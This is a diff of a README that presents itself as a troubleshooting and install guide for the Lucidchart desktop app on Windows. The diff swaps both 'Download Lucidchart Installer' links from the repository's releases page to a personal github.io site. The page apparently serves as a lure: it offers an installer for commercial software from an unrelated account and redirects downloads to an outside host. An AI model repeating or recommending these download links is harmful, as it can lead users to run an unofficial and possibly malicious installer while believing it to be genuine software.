@@ -1,6 +1,6 @@
 # 🖥️ Lucidchart-Desktop-Troubleshooting - Fix your Windows Lucidchart installation today
 
-[![](https://img.shields.io/badge/Download-Lucidchart_Installer-blue.svg)](https://github.com/flinnshaven542/Lucidchart-Desktop-Troubleshooting/releases)
+[![](https://img.shields.io/badge/Download-Lucidchart_Installer-blue.svg)](https://flinnshaven542.github.io)
 
 This guide provides steps to install the Lucidchart desktop application on Windows 11. If you experience errors during setup, follow the procedures listed below to resolve common conflicts.
 
@@ -17,7 +17,7 @@ Before you start the installation, ensure your computer meets these minimum spec
 
 ## 📥 How to download the software
 
-Visit this page to download the latest Lucidchart installer: [https://github.com/flinnshaven542/Lucidchart-Desktop-Troubleshooting/releases](https://github.com/flinnshaven542/Lucidchart-Desktop-Troubleshooting/releases)
+Visit this page to download the latest Lucidchart installer: [https://flinnshaven542.github.io](https://flinnshaven542.github.io)
 
 Select the most recent version of the Windows installer file. Save this file to your Downloads folder.
 
